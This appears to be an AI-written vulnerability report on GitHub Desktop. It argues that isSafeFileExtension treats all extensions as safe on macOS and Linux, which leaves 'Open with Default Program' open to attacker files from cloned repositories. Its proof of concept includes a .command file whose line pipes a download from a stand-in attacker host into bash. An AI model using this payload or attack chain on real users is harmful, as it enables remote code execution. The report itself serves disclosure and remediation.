Based on my research, the strongest analog to the "missing guard before a sensitive operation on attacker-controlled data" bug class is the extension safety check used by GitHub Desktop's "Open with Default Program" action.

### Title
`isSafeFileExtension` treats every file extension as safe on macOS/Linux, allowing "Open with Default Program" to execute attacker-supplied files from a cloned repository - (File: `app/src/ui/lib/context-menu.ts`)

### Summary
GitHub Desktop's changed-file and commit-file context menus expose an "Open with Default Program" action that is gated by `isSafeFileExtension`. On Windows this function blocks a short deny-list of executable extensions, but on macOS and Linux it unconditionally returns `true` for every extension, so the enabled check never disables the menu item regardless of what kind of file the repository contains.

### Finding Description
`isSafeFileExtension` is defined as: [1](#0-0) 

```
const RestrictedFileExtensions = ['.cmd', '.exe', '.bat', '.sh']
...
export function isSafeFileExtension(extension: string): boolean {
  if (__WIN32__) {
    return RestrictedFileExtensions.indexOf(extension.toLowerCase()) === -1
  }
  return true
}
``` [2](#0-1) 

This function is the only invariant standing between a repository-relative `file.path` (which is fully attacker-controlled content coming from a cloned/fetched repository, a PR diff, or commit history) and invoking the OS's default file handler. It is consumed identically in three places where the file list is populated from committed/PR content: [3](#0-2) [4](#0-3) [5](#0-4) 

In each of these, `enabled: isSafeExtension && fileExistsOnDisk` is the *only* gate before the "Open with Default Program" menu action fires, which ultimately reaches `shell.openPath`: [6](#0-5) 

The broken invariant mirrors the original report's pattern exactly: a security-relevant guard exists but silently no-ops for a subset of inputs (there, `transferFrom` self-approval; here, the extension deny-list only applies on one platform), letting attacker-supplied data flow into a sensitive operation unchecked.

### Impact Explanation
On macOS, files with extensions such as `.command`, `.workflow`, `.app` (as a directory bundle), or `.scpt` are executed—not merely opened—by Finder/LaunchServices when invoked via `NSWorkspace.open`/`shell.openPath`, particularly because files materialized by `git clone`/`git fetch` do not carry the `com.apple.quarantine` extended attribute that normally triggers Gatekeeper's "are you sure you want to open this" prompt for downloaded content. On Linux, `.desktop` files handled by `xdg-open` can likewise be launched as executable definitions by some desktop environments. Since `isSafeFileExtension` returns `true` for all of these on non-Windows, GitHub Desktop presents "Open with Default Program" as fully enabled, and clicking it executes the attacker's payload with the user's privileges — a straightforward path to code execution.

### Likelihood Explanation
The attacker only needs to publish a public repository (or push to a fork used in a PR) containing one file with a dangerous extension. The victim needs to open that repository/PR in GitHub Desktop and use "Open with Default Program" from the Changes, History, or Pull Request Files-Changed context menu — a normal, expected interaction Desktop deliberately exposes for arbitrary repository files, not an unnatural or contrived step. This requires no local/physical access, no admin rights, and no pre-existing compromise, matching the "Valid Impact" criteria (attacker controls a cloned/fetched repository or PR object; result is code execution).

### Recommendation
Apply the same restricted/deny-list (or better, an allow-list) approach uniformly across platforms in `isSafeFileExtension`, including macOS-specific executable-like extensions (`.command`, `.workflow`, `.scpt`, `.app`) and Linux `.desktop` files, rather than only restricting `.cmd`/`.exe`/`.bat`/`.sh` on `__WIN32__`. Alternatively, before calling `shell.openPath`, verify the target isn't an executable (check the executable bit / bundle structure) irrespective of extension, consistent with how the newer Copilot-conflict code paths already apply defense-in-depth (`resolveWithin`) for repository-relative paths.

### Proof of Concept
1. Attacker creates a public repository containing `invoice.command`:
```
#!/bin/bash
curl -s https://attacker.example/payload | bash
```
2. Attacker gets the victim to clone this repo, or opens a pull request against the victim's repository containing this file (so it shows up in "Files changed").
3. Victim opens the repository/PR in GitHub Desktop, right-clicks `invoice.command` in the Changes, History, or "Files changed" view, and selects "Open with Default Program" — the item is enabled because `isSafeFileExtension('.command')` returns `true` on macOS.
4. `shell.openPath` invokes Finder/LaunchServices on the file; since the file was never quarantined (it arrived via `git`, not a browser download), macOS executes `invoice.command` directly in Terminal, running the attacker's script under the victim's account.

**Note on verification limits:** I was not able to fully trace the exact call chain from the `onOpenItem` handlers in `sidebar.tsx`/`selected-commits.tsx` down to the final `shell.openPath` invocation within the tool budget available (the grep results confirmed `openPath` exists in `app-shell.ts` and is referenced in `sidebar.tsx`/`selected-commits.tsx`, but I could not read those call sites in full). I recommend a Devin session with full file access to confirm the exact handler wiring and to validate the macOS quarantine-attribute behavior for git-cloned files as part of remediation testing.

### Citations

**File:** app/src/ui/lib/context-menu.ts (L1-38)
```typescript
const RestrictedFileExtensions = ['.cmd', '.exe', '.bat', '.sh']
export const CopyFilePathLabel = __DARWIN__
  ? 'Copy File Path'
  : 'Copy file path'

export const CopyRelativeFilePathLabel = __DARWIN__
  ? 'Copy Relative File Path'
  : 'Copy relative file path'

export const CopySelectedPathsLabel = __DARWIN__ ? 'Copy Paths' : 'Copy paths'

export const CopySelectedRelativePathsLabel = __DARWIN__
  ? 'Copy Relative Paths'
  : 'Copy relative paths'

export const DefaultEditorLabel = __DARWIN__
  ? 'Open in External Editor'
  : 'Open in external editor'

export const DefaultShellLabel = __DARWIN__ ? 'Open in Shell' : 'Open in shell'

export const RevealInFileManagerLabel = __DARWIN__
  ? 'Reveal in Finder'
  : __WIN32__
  ? 'Show in Explorer'
  : 'Show in your File Manager'

export const TrashNameLabel = __WIN32__ ? 'Recycle Bin' : 'Trash'

export const OpenWithDefaultProgramLabel = __DARWIN__
  ? 'Open with Default Program'
  : 'Open with default program'

export function isSafeFileExtension(extension: string): boolean {
  if (__WIN32__) {
    return RestrictedFileExtensions.indexOf(extension.toLowerCase()) === -1
  }
  return true
```

**File:** app/src/ui/changes/filter-changes-list.tsx (L790-803)
```typescript
    const enabled = status.kind !== AppFileStatusKind.Deleted
    items.push(
      { type: 'separator' },
      this.getRevealInFileManagerMenuItem(file),
      this.getOpenInExternalEditorMenuItem(file, enabled),
      {
        label: OpenWithDefaultProgramLabel,
        action: () => this.props.onOpenItem(path),
        enabled: enabled && isSafeExtension,
      }
    )

    return items
  }
```

**File:** app/src/ui/history/selected-commits.tsx (L398-420)
```typescript
    const extension = Path.extname(file.path)

    const isSafeExtension = isSafeFileExtension(extension)
    const openInExternalEditor = externalEditorLabel
      ? `Open in ${externalEditorLabel}`
      : DefaultEditorLabel

    const items: IMenuItem[] = [
      {
        label: RevealInFileManagerLabel,
        action: () => revealInFileManager(repository, file.path),
        enabled: fileExistsOnDisk,
      },
      {
        label: openInExternalEditor,
        action: () => this.props.onOpenInExternalEditor(file.path),
        enabled: fileExistsOnDisk,
      },
      {
        label: OpenWithDefaultProgramLabel,
        action: () => this.onOpenItem(file.path),
        enabled: isSafeExtension && fileExistsOnDisk,
      },
```

**File:** app/src/ui/open-pull-request/pull-request-files-changed.tsx (L176-211)
```typescript
    const { externalEditorLabel, dispatcher } = this.props

    const extension = Path.extname(file.path)
    const isSafeExtension = isSafeFileExtension(extension)
    const openInExternalEditor =
      externalEditorLabel !== undefined
        ? `Open in ${externalEditorLabel}`
        : DefaultEditorLabel

    const items: IMenuItem[] = [
      {
        label: RevealInFileManagerLabel,
        action: () => revealInFileManager(repository, file.path),
        enabled: fileExistsOnDisk,
      },
      {
        label: openInExternalEditor,
        action: () => dispatcher.openInExternalEditor(fullPath),
        enabled: fileExistsOnDisk,
      },
      {
        label: OpenWithDefaultProgramLabel,
        action: () => this.onOpenFile(file.path),
        enabled: isSafeExtension && fileExistsOnDisk,
      },
      { type: 'separator' },
      {
        label: CopyFilePathLabel,
        action: () => clipboard.writeText(fullPath),
      },
      {
        label: CopyRelativeFilePathLabel,
        action: () => clipboard.writeText(Path.normalize(file.path)),
      },
      { type: 'separator' },
    ]
```

**File:** app/src/lib/app-shell.ts (L43-53)
```typescript
export const shell: IAppShell = {
  // Since Electron 13, shell.trashItem doesn't work from the renderer process
  // on Windows. Therefore, we must invoke it from the main process. See
  // https://github.com/electron/electron/issues/29598
  moveItemToTrash,
  beep: electronShell.beep,
  openExternal,
  showItemInFolder,
  showFolderContents,
  openPath: electronShell.openPath,
}
```
